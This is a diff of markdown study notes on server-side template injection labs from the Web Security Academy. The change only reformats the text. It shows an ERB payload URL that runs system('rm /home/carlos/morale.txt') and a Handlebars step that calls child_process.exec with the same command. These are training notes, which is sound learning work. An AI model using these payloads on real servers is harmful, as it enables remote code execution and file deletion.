@@ -13,12 +13,11 @@ In the URL:
 ## SSTI Vulnerabilities:
 - ==Basic server-side template injection== 
   Review ERB Template documentation and test to see if the value is computed
-  
-  https://lab_id.web-security-academy.net/?message=<%= 7\*7 %>
+`  https://lab_id.web-security-academy.net/?message=<%= 7*7 %>`
   
   Use system(string) to execute
   
-  https://lab_id.web-security-academy.net/?message=%3C%=%20system(%22rm%20/home/carlos/morale.txt%22)%20%%3E
+`  https://lab_id.web-security-academy.net/?message=%3C%=%20system(%22rm%20/home/carlos/morale.txt%22)%20%%3E`
 - ==Server-side template injection in an unknown language with a documented exploit==
   Handlebars server-side template injection
   1. Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:
